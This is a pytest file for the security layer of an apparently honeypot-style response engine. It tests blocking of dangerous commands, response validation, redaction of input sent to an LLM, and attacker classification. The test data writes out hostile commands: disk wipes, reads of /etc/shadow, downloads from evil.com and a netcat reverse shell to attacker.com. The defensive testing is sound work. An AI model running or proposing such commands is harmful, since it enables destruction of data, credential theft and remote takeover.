"""Tests for Response Engine Security (Feature 8)"""
import pytest
from src.response.safety import SafetyIsolator, SafetyCheck, DANGEROUS_PATTERNS
from src.response.llm_classifier import classify_threat, ThreatAnalysis, ThreatClass


class TestDangerousPatterns:
    """Test dangerous command patterns"""
    
    def test_rm_rf_root_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("rm -rf /") is None
    
    def test_mkfs_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("mkfs.ext4 /dev/sda") is None
    
    def test_device_write_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("echo pwned > /dev/sda") is None
    
    def test_system_file_access_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("cat /etc/passwd") is None
        assert isolator.sanitize_command("cat /etc/shadow") is None
    
    def test_outbound_network_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("curl http://evil.com") is None
        assert isolator.sanitize_command("wget http://evil.com/payload") is None
    
    def test_reverse_shell_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("nc -e /bin/sh attacker.com 4444") is None
    
    def test_shell_execution_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("bash -i") is None
        assert isolator.sanitize_command("sh -c id") is None
    
    def test_code_execution_blocked(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("eval('import os')") is None
        assert isolator.sanitize_command("python -c 'import os; os.system(\"id\")'") is None
    
    def test_safe_command_passes(self):
        isolator = SafetyIsolator()
        assert isolator.sanitize_command("ls -la") == "ls -la"
        assert isolator.sanitize_command("pwd") == "pwd"


class TestSafetyResponseValidation:
    """Test response safety checks"""
    
    def test_allowed_template_passes(self):
        isolator = SafetyIsolator()
        check = isolator.validate_response("Cisco IOS version", "cisco_router/show_version")
        assert check.safe == True
    
    def test_unknown_template_blocked(self):
        isolator = SafetyIsolator()
        check = isolator.validate_response("content", "unknown/malicious")
        assert check.safe == False
    
    def test_private_key_blocked_in_response(self):
        isolator = SafetyIsolator()
        check = isolator.validate_response(
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...",
            "cisco_router/show_version"
        )
        assert check.safe == False
    
    def test_real_domain_blocked(self):
        isolator = SafetyIsolator()
        check = isolator.validate_response(
            "Contact: admin@hiddenlabs.cc",
            "cisco_router/show_version"
        )
        assert check.safe == False


class TestLLMSafety:
    """Test LLM input preparation - never trust user input"""
    
    def test_llm_input_redacted(self):
        isolator = SafetyIsolator()
        commands = ["curl http://secret.com", "key=AB34Fake1234567890XYZ"]
        prepared = isolator.prepare_for_llm(commands)
        assert "[URL]" in prepared
        assert "[REDACTED]" in prepared
    
    def test_llm_only_receives_last_10(self):
        isolator = SafetyIsolator()
        commands = [f"cmd{i}" for i in range(20)]
        prepared = isolator.prepare_for_llm(commands)
        lines = prepared.split("\n")
        assert len(lines) == 10


class TestThreatClassification:
    """Test LLM classifier security"""
    
    def test_rule_based_scanner_detection(self):
        result = classify_threat(["nmap -sS 10.0.0.1", "masscan --rate 1000"])
        assert result.threat_class == ThreatClass.AUTOMATED_SCANNER
        assert result.confidence == 0.9
    
    def test_rule_based_sk_detection(self):
        result = classify_threat(["whoami", "id", "uname -a", "cat /etc/passwd"])
        assert result.threat_class == ThreatClass.SCRIPT_KIDDIE
    
    def test_rule_based_ai_detection(self):
        # Systematic short commands
        commands = ["ls", "ls", "ls", "ls", "ls", "ls", "ls"]
        result = classify_threat(commands, use_llm=False)
        assert result.threat_class == ThreatClass.POSSIBLE_AI_AGENT
    
    def test_llm_error_fallback(self):
        # With invalid model path, should fallback
        import os
        original = os.environ.get("LOCAL_LLM_MODEL")
        os.environ["LOCAL_LLM_MODEL"] = "/nonexistent/model.bin"
        
        result = classify_threat(["ls"], use_llm=True)
        assert result.threat_class == ThreatClass.UNKNOWN
        assert "fallback" in result.indicators
        
        if original:
            os.environ["LOCAL_LLM_MODEL"] = original
        else:
            os.environ.pop("LOCAL_LLM_MODEL", None)